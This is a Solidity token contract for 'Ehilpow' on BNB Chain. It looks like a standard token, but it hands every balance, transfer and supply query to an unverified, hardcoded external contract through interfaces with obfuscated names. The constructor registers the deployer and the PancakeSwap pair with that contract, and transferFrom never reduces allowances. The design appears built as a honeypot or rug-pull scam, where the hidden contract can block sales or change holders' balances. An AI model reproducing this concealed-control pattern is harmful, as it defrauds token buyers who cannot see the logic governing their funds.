/**
 *Submitted for verification at BscScan.com on 2022-04-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface interfunctiinfound {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface filipssjonggate {

    function dwpartmentit(uint256 total,address tokenAddress,address dividepc,address _bothupright) external;

    function oceannetwork() view external returns (uint256);

    function standingtower(address _owner) view external returns (uint256);

    function dottedline(address _from, address _to, uint256 _value) external;

}

interface sundaybillgates {
    function factory() external pure returns (address);

    
}

contract Ehilpow {
	
    string public name = "Ehilpow";
    string  public symbol = "Ehilpow";
    uint8   public decimals = 9;
	uint256 public totalSupply_ = 10000000000 * (10 ** decimals);
	
	address public dividepc;
	address public bothupright;
	sundaybillgates public estimate;
	address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

	filipssjonggate process = filipssjonggate(0x090f699F32AF116b3cf89704f6E24b73178Fd369);

	constructor() {
		dividepc=msg.sender;
        
        estimate = sundaybillgates(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        bothupright = interfunctiinfound(estimate.factory()).createPair(WBNB, address(this));

        process.dwpartmentit(totalSupply_, address(this), dividepc,bothupright);

        emit Transfer(address(0), dividepc, totalSupply_);
    }
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) public allowed;
	


    function balanceOf(address _owner) public view returns (uint256) {
        return process.standingtower(_owner);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(process.standingtower(msg.sender) >= _value);

        process.dottedline(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);

		return true;
    }

    function totalSupply() public view returns (uint256) {
        return process.oceannetwork();
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= process.standingtower(_from));
        require(_value <= allowed[_from][msg.sender]);
		
		process.dottedline(_from,_to,_value);

        emit Transfer(_from, _to, _value);
        
		return true;
    }
	
	
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
	function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
		
        return true;
    }
}